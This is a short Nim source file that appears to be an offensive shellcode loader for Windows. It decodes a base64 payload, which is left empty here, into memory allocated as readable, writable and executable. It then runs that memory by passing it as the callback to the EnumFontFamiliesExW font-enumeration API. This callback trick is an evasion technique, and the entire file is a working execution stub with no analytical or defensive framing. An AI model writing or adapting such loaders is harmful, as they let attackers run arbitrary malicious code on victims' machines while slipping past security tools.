import base64

import winim
import winim/lean

proc enumFontFamiliesW[byte](shellcode: openArray[byte]): void =
  
  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
  
  let dc = GetDC(0);
  EnumFontFamiliesExW(dc, cast[LPLOGFONTW](0), cast[FONTENUMPROCW](rPtr), cast[LPARAM](nil), 0);

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = ""

  let shellcode = toByteSeq(decode(enc))
  enumFontFamiliesW(shellcode)
